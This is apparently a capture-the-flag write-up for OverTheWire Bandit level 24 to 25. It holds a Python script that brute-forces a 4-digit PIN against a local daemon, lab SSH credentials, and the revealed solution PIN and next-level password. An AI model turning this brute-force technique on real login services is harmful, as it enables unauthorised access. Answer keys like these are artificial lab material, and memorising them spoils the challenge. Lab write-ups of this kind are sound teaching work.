# Level 24 → Level 25

## Description
```Description
## Level Goal

A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  
You do not need to create new connections each time
```

## Credentials
```Credentials
SSH Information  
Host: bandit.labs.overthewire.org  
Port: 2220
username: bandit24
Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
```

## Lets Explore
```bash
bandit24@bandit:/tmp/t3ep$ nano python.py
Unable to create directory /home/bandit24/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit24@bandit:/tmp/t3ep$ python3 python.py 
[Server says]: I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Python File
```Python
#!/usr/bin/env python3
import socket

PASS = "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
HOST = "localhost"
PORT = 30002

s = socket.create_connection((HOST, PORT))
f = s.makefile(mode="rw", buffering=1, encoding="utf-8", newline="\n")

# Read and print the welcome message
welcome = f.readline().strip()
print("[Server says]:", welcome)

for i in range(10000):
    pin = f"{i:04d}"
    f.write(f"{PASS} {pin}\n")
    resp = f.readline().strip()
    print(pin, "->", resp)
    if "Wrong" not in resp and resp != "":
        print("\n===> SUCCESS! server response:\n", resp)
        break

f.close()
s.close()
```

Output the correct Secret code is `0737`
And Run Code With Password
```bash
bandit24@bandit:/tmp/t3ep$ echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 0737" | nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Got The Password
```Password
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```
